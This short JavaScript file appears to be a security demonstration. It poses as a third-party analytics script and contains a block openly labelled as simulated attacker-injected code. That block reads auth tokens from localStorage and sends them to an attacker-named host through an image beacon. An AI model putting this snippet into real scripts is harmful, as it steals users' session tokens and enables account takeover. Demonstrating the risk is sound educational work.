// Normal analytics code would run here.
console.log("analytics is running on your site");

// Simulate attacker injected code.
if (localStorage) {
  let token;
  const tokenChoices = ["token", "jwt", "authToken"];
  for (const choice of tokenChoices) {
    if (localStorage[choice] && typeof localStorage[choice] === "string") {
      token = localStorage[choice];
      break;
    }
  }
  if (token) {
    let endpoint = "http://local.attacker.xxx:8083";
    if (window.location.host.endsWith("appspot.com")) {
      endpoint = "https://attacker-dot-local-storage-security.appspot.com";
    }
    new Image().src = `${endpoint}/spacer.gif?z=${encodeURIComponent(
      token
    )}&t=${new Date()}`;
  }
}
// End attacker injected code.
